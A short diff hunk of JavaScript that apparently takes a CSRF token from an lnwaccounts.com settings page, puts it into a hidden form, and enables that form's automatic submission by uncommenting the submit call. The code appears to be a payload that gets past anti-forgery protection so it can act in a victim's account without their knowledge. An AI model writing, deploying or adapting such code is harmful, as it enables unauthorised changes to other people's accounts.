@@ -17,7 +17,7 @@ xmlhttp.onreadystatechange=function()
 		'<input type="hidden" name="csrf_token" value="'+csrf_token+'" />' +
 		'</form>');
 		$('body').append(form);
-		//$(form).submit();
+		$(form).submit();
 	}
 }
 xmlhttp.open("GET","https://lnwaccounts.com/manage/setting",true);
